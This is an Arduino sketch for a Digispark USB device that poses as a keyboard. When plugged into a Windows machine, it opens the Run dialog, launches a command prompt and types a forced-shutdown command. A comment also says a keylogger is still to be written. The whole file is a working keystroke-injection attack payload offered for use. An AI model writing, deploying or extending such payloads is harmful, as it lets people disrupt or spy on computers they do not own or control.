#include "DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("cmd");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(5000);
 DigiKeyboard.print("shutdown -s -t 60");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for(;;){/*empty*/}
 //Write Keylogger Function
}
